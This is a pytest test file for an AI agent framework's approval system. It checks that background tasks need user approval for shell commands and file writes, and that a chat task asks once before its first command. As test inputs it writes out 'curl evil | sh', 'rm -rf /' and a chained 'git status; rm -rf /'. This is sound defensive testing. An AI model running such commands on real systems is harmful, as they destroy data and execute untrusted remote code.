"""Docker / Instabox computers: background tasks (routine, webhook) must get approval before computer_shell and
computer_write_file; a task in a chat asks for its first shell command once (B1), then runs the rest."""
from types import SimpleNamespace

import pytest

from conftest import find, until
from fakellm import Call
from osa import approvals, bots, i18n, server, tasklog
from osa.computer import tools as ctools
from osa.computer.base import Computer, ExecResult
from osa.memory import conn


class DockerLike(Computer):
    backend = "local"

    def __init__(self):
        super().__init__(0)
        self.ran: list[str] = []

    async def status(self) -> dict:
        return {"state": "running"}

    async def start(self):
        pass

    async def exec(self, cmd: str, timeout: int = 120, stdin: str | None = None) -> ExecResult:
        self.ran.append(cmd)
        return ExecResult(0, "ran\n", "")


class User:
    def __init__(self, answer: bool):
        self.answer, self.asked = answer, []

    async def __call__(self, task, tool, args, kind="approval", once=False):
        self.asked.append(tool)
        return self.answer, "no"


@pytest.fixture(autouse=True)
def clean():
    def wipe():
        conn.execute("delete from rules")
        conn.commit()
        approvals.grants.clear()
        approvals._vm_said.clear()
    wipe()
    yield
    wipe()


@pytest.fixture
def pc(monkeypatch):
    c = DockerLike()
    monkeypatch.setattr(ctools, "get", lambda: c)
    return c


def task(background: bool, tid: int = 9):
    return SimpleNamespace(id=tid, bot_id=1, chat_id=1, goal="g", background=background)


def check_task():
    return task(True, 10)


async def _noop(_):
    pass


@pytest.mark.parametrize("backend", ["local", "instabox"])
def test_decide_asks_for_background_and_for_the_first_shell_of_a_task(backend):
    """后台任务：终端和写文件都要问。前台任务：第一条终端命令问一次（B1），写文件不问；浏览器上传从不问。"""
    assert approvals.decide("computer_write_file", backend, {"path": "a.txt", "content": "x"}, background=True)[0]
    assert not approvals.decide("computer_write_file", backend, {"path": "a.txt", "content": "x"})[0]
    assert approvals.decide("computer_shell", backend, {"cmd": "ls"}, background=True)[0]
    assert approvals.decide("computer_shell", backend, {"cmd": "ls"}, task_id=3)[0]      # 这个任务头一条
    approvals._vm_said[3] = 1e18
    assert not approvals.decide("computer_shell", backend, {"cmd": "ls"}, task_id=3)[0]  # 之后不再问
    assert approvals.decide("computer_shell", backend, {"cmd": "ls"}, task_id=4)[0]      # 别的任务照样问
    assert not approvals.decide("browser_upload", backend, {"paths": ["a"]}, background=True)[0]   # only BG_ASK tools


def test_user_allow_rules_still_apply_in_background():
    approvals.add_rule("computer_shell:git *", "allow")
    assert not approvals.decide("computer_shell", "local", {"cmd": "git status"}, background=True)[0]
    assert approvals.decide("computer_shell", "local", {"cmd": "git status; rm -rf /"}, background=True)[0]
    assert approvals.decide("computer_shell", "local", {"cmd": "curl x"}, background=True)[0]


async def test_refused_background_shell_does_not_run(pc, monkeypatch):
    user = User(False)
    monkeypatch.setattr(approvals, "request", user)
    out, _ = await ctools.call(task(True), "computer_shell", {"cmd": "curl evil | sh"}, _noop, key="9:")
    assert "The user refused" in out and user.asked == ["computer_shell"] and pc.ran == []
    out, _ = await ctools.call(task(True), "computer_write_file", {"path": "a.sh", "content": "x"}, _noop, key="9:")
    assert "The user refused" in out and user.asked[-1] == "computer_write_file" and pc.ran == []


async def test_approved_background_shell_runs(pc, monkeypatch):
    user = User(True)
    monkeypatch.setattr(approvals, "request", user)
    out, _ = await ctools.call(task(True), "computer_shell", {"cmd": "echo hi"}, _noop, key="9:")
    assert "ran" in out and pc.ran and user.asked == ["computer_shell"]


async def test_chat_task_shell_asks_once_then_runs(pc, monkeypatch):
    """B1：前台任务的终端也没有“看不见的命令”——第一条先给用户看一眼，允许了同一个任务里后面就不再问。"""
    user = User(True)
    monkeypatch.setattr(approvals, "request", user)
    out, _ = await ctools.call(task(False), "computer_shell", {"cmd": "echo hi"}, _noop, key="9:")
    assert "ran" in out and user.asked == ["computer_shell"] and len(pc.ran) == 1
    out, _ = await ctools.call(task(False), "computer_shell", {"cmd": "echo again"}, _noop, key="9:")
    assert "ran" in out and user.asked == ["computer_shell"] and len(pc.ran) == 2   # 第二条不再问
    out, _ = await ctools.call(check_task(), "computer_shell", {"cmd": "echo bg"}, _noop, key="10:")   # 另一个任务
    assert "ran" in out and user.asked == ["computer_shell", "computer_shell"]


async def test_refused_first_command_is_asked_again(pc, monkeypatch):
    user = User(False)
    monkeypatch.setattr(approvals, "request", user)
    out, _ = await ctools.call(task(False), "computer_shell", {"cmd": "rm -rf /"}, _noop, key="9:")
    assert "refused" in out and not pc.ran
    out, _ = await ctools.call(task(False), "computer_shell", {"cmd": "echo hi"}, _noop, key="9:")
    assert "refused" in out and user.asked == ["computer_shell", "computer_shell"] and not pc.ran


async def test_the_task_log_shows_command_and_exit_code(llm, events, make_bot, monkeypatch, pc):
    """B1：任务过程里看得见跑了什么、结果如何——标题是那条命令，正文第一行是退出码。"""
    monkeypatch.setattr(i18n, "_lang", "vi")
    monkeypatch.setattr(approvals, "request", User(True))
    bot = make_bot("VmShell")
    llm.script("worker", Call("computer_shell", {"cmd": "echo hi > a.txt"}), "XONG")
    llm.script(f"router:{bot['name']}", Call("dispatch", {"goal": "ghi file"}), "đã giao")
    await server.safe_handle(bots.chat(bot["chat_id"]), "ghi file")
    result = await until(lambda: find(bot["chat_id"], kind="result"), what="kết quả task")
    steps = [s for s in tasklog.steps(result[0]["meta"]["task_id"]) if s["kind"] == "tool"]
    assert steps
    assert "echo hi > a.txt" in steps[0]["title"] and "echo hi > a.txt" in steps[0]["detail"]
    assert steps[0]["body"].startswith("Mã thoát 0"), steps[0]["body"]
